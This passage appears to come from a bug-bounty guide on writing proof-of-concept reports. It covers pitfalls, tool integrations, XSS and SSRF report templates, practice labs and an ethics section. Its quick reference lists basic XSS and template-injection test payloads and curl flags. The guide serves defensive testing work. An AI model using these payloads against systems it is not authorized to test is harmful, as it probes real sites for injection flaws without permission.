**Severity Justification**: A clear PoC demonstrating actual exploitation typically maintains or increases the initially assessed severity. PoCs that only show theoretical vulnerability often result in severity downgrades during triage.

**Time to Bounty**: Automated PoC generation reduces the time from finding discovery to submission from an average of 4 hours to 30 minutes. Over a year of active bug bounty hunting, this time savings translates to significantly more submissions.

**Resubmission Prevention**: Complete PoCs prevent resubmission of duplicate findings, as the clear evidence and documentation make it easy for triagers to determine uniqueness.

## Common Pitfalls

1. **Including real credentials**: Never include actual usernames, passwords, API keys, or session tokens in PoC submissions. Use placeholders and describe the process.
2. **Exceeding scope**: Ensure all PoC URLs and targets are within the authorized testing scope. Out-of-scope testing invalidates the finding.
3. **Non-reproducible PoCs**: Race conditions and timing-dependent vulnerabilities require special handling. Document the conditions needed for reproduction.
4. **Missing impact explanation**: A PoC without impact statement is incomplete. Always explain what an attacker could achieve.
5. **Overly complex PoCs**: Start simple. A one-line curl command is more valuable than a 500-line Python script if both demonstrate the same impact.
6. **Forgetting to redact PII**: Screenshots and videos must not contain real user data, email addresses, or personal information.

## Integration Points

- **Burp Suite**: Import/export PoC requests directly from Burp history
- **Nuclei**: Convert nuclei finding output into PoC templates automatically
- **OWASP ZAP**: Use ZAP's built-in PoC generation for common vulnerability types
- **Playwright**: Browser automation for complex web-based PoC demonstrations
- **FFmpeg**: Video processing for PoC recording post-production
- **ImageMagick**: Screenshot annotation and watermarking for evidence
- **Jinja2**: Template-based PoC generation for repeated vulnerability patterns
- **GitHub**: Version control for PoC libraries and templates

## Reporting Templates

**XSS PoC Template**:
```markdown
## Vulnerability: [Reflected/Stored/DOM] XSS in [Parameter]

### Prerequisites
- Valid user session
- Access to affected URL

### Steps to Reproduce
1. Navigate to `{url}`
2. Enter payload `{payload}` in the `{param}` field
3. Observe JavaScript execution

### Evidence
[curl command / screenshot / video]

### Impact
Attacker can steal session tokens, perform actions as the victim, or redirect to malicious sites.

### Remediation
Implement context-aware output encoding. Use Content-Security-Policy headers.
```

**SSRF PoC Template**:
```markdown
## Vulnerability: Server-Side Request Forgery

### Prerequisites
- Authenticated access to the affected endpoint

### Steps to Reproduce
1. Send request to `{url}`
2. Set `{param}` to `{internal_url}`
3. Server fetches and returns internal resource

### Evidence
[HTTP request/response with internal data]

### Impact
Access to internal services, cloud metadata, and potential credential theft.

### Remediation
Implement URL validation with allowlist. Block private IP ranges.
```

## Practice Labs

1. **DVWA XSS**: Practice XSS PoC development against Damn Vulnerable Web Application's XSS module
2. **WebGoat SSRF**: Develop SSRF PoCs against WebGoat's SSRF challenges
3. **PortSwigger Web Security Academy**: Complete the IDOR and authentication labs with full PoC documentation
4. **HackTheBox**: Develop PoCs for CTF challenges and document them in submission format
5. **Build Your Own Lab**: Set up a local vulnerable application (Juice Shop, NodeGoat) and practice end-to-end PoC development

## Ethics

PoC development must always prioritize safety and authorization. PoCs should demonstrate vulnerability without causing harm — never execute destructive commands, exfiltrate real user data, or disrupt production services. All testing must occur within the authorized scope defined by the program or engagement. When in doubt, use test accounts and synthetic data. Document all testing activities with timestamps for accountability. Remember that a well-crafted PoC serves the dual purpose of proving the vulnerability AND helping the development team understand and fix it. The goal is to improve security, not to demonstrate exploitation capability.

## Quick Reference

**Common XSS Payloads**:
| Context | Payload | Use Case |
|---------|---------|----------|
| HTML Body | `<script>alert(1)</script>` | Basic reflected XSS |
| HTML Attribute | `" onfocus=alert(1) autofocus="` | Attribute injection |
| JavaScript | `';alert(1);//` | JS string breakout |
| CSS | `background:url(javascript:alert(1))` | CSS-based (legacy) |
| Template | `{{7*7}}` | Template injection test |

**HTTP Methods for PoC Testing**:
| Method | Use Case |
|--------|----------|
| GET | URL parameter injection, IDOR |
| POST | Form data manipulation, API testing |
| PUT | Resource modification |
| DELETE | Resource deletion |
| PATCH | Partial updates |
| OPTIONS | CORS preflight bypass |
| TRACE | XST (Cross-Site Tracing) |

**curl PoC Flags**:
```bash
-v          # Verbose output (shows headers)
-k          # Ignore SSL errors
-b "cookie" # Send cookies
-H "header" # Custom headers
-d "data"   # POST data
-X METHOD   # Specify HTTP method
-o file     # Save response to file
-w "%{http_code}" # Output status code only
```

**Severity Quick Guide**:
| Impact | CVSS | Severity |
|--------|------|----------|
| RCE, SQLi, Auth Bypass | 9.0-10.0 | Critical |
| XSS, SSRF, IDOR | 7.0-8.9 | High |
| Info Disclosure, CSRF | 4.0-6.9 | Medium |
| Missing Headers, Version Disclosure | 0.1-3.9 | Low |
| Best Practice Issues | 0.0 | Info |
